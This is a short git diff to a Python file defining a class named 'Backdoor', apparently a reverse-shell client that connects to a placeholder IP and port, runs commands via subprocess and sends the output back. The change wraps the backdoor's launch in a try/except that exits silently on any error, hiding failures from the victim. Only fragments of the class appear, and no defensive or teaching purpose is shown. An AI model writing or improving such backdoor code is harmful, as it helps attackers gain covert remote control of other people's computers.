@@ -4,6 +4,7 @@ import subprocess
 import json
 import os
 import base64
+import sys
 
 class Backdoor:
     def __init__(self, ip, p):
@@ -67,5 +68,8 @@ class Backdoor:
             self.send_data(output)
 
 
-talk = Backdoor("XX.XX.XX.XX", xxxx)
-talk.start()
+try:
+    talk = Backdoor("XX.XX.XX.XX", xxxx)
+    talk.start()
+except Exception:
+    sys.exit()
